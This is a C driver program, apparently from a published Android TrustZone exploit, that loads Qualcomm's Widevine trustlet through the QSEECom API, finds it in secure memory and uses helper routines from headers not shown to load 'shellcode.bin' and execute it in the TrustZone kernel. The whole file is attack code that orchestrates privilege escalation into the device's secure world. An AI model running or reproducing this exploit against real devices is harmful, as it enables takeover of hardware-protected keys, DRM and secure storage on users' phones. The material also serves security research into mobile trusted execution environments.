#include <sys/types.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "QSEEComAPI.h"
#include "symbols.h"
#include "widevine_commands.h"
#include "vuln.h"
#include "defs.h"
#include "exploit_utilities.h"
#include "tzbsp_exploit.h"
#include "tzbsp_symbols.h"
#include "qsee_syscalls.h"

int main() {

	//Getting the global handle used to interact with QSEECom
	struct qcom_wv_handle* handle = initialize_wv_handle();
	if (handle == NULL) {
		perror("[-] Failed to initialize Widevine handle");
		return -errno;
	}

	//Loading the widevine application
	int res = (*handle->QSEECom_start_app)((struct QSEECom_handle **)&handle->qseecom,
											WIDEVINE_PATH, WIDEVINE_APP_NAME, WIDEVINE_BUFFER_SIZE);
	if (res < 0) {
		perror("[-] Failed to load Widevine");
		return -errno;
	}
	printf("[+] Widevine load res: %d\n", res);

	//Finding the application within the secure app region
	void* app = find_widevine_application(handle);
	if (!app) {
		perror("[-] Failed to find application\n");
		(*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
		return -ENOENT;
	}
	printf("[+] Found application at: %p\n", app);

	//Loading the code chunk
	uint32_t exec_res = 0;
	if ((res = tzbsp_load_and_exec_file(handle, app, "shellcode.bin", &exec_res)) < 0) {
		printf("[-] Failed to load and execute file: %s\n", strerror(-res));
		return res;
	}
	printf("[+] Executed code in TrustZone kernel, result: %08X\n", exec_res);
	
	//Unloading the widevine app
	(*handle->QSEECom_shutdown_app)((struct QSEECom_handle **)&handle->qseecom);
	printf("[+] Widevine unload res: %d\n", res);

	return 0;

}
